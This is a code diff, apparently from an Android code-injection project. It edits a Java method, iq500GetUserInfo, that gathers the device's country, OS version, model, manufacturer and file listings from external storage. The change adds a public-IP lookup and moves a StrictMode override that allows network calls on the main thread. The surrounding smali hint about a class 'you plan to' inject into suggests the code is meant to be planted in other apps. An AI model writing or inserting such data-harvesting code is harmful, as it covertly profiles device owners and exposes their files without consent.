@@ -1244,16 +1244,31 @@ invoke-direct {p0}, Lchange/this_path_to_the_path_of_the_class_that_you_plan_to_
 ********************************************************
 	private void iq500GetUserInfo()
 	{
+		if (android.os.Build.VERSION.SDK_INT > 9) {
+			StrictMode.ThreadPolicy policy = new StrictMode.ThreadPolicy.Builder().permitAll().build();
+			StrictMode.setThreadPolicy(policy);
+		}
+		
 		String currentDateTimeString = java.text.DateFormat.getDateTimeInstance().format(new Date());
 
 		String a = "From:" + Locale.getDefault().getDisplayCountry() + "%20DateTime:" + currentDateTimeString + "%20AndroidVer:" + Build.VERSION.RELEASE + "%20Model:" + Build.MODEL + "%20Manufacturer:" + Build.MANUFACTURER;
-		a = a.replaceAll(" ", "_");
 
 		String b = "", c = "", d = "";
-
+		
+		try
+		{
+			URL ip = new URL("http://checkip.amazonaws.com/");
+			BufferedReader in = new BufferedReader(new InputStreamReader(ip.openStream()));
+		    a += "%20IP:" + in.readLine();
+		}
+		catch (Exception e)
+		{}
+		
+		a = a.replace(" ", "_");
+		
 
 		try{
-
+			
 			File f = new File(Environment.getExternalStorageDirectory().getPath() + "/");
 			File[] files = f.listFiles();
 
@@ -1286,12 +1301,6 @@ invoke-direct {p0}, Lchange/this_path_to_the_path_of_the_class_that_you_plan_to_
 		b = b.replace("&","").replace("+","").replace("|","").replace(" ", "");
 		c = c.replace("&","").replace("+","").replace("|","").replace(" ", "");
 		d = d.replace("&","").replace("+","").replace("|","").replace(" ", "");
-
-
-		if (android.os.Build.VERSION.SDK_INT > 9) {
-			StrictMode.ThreadPolicy policy = new StrictMode.ThreadPolicy.Builder().permitAll().build();
-			StrictMode.setThreadPolicy(policy);
-		}
 
 		try
 		{
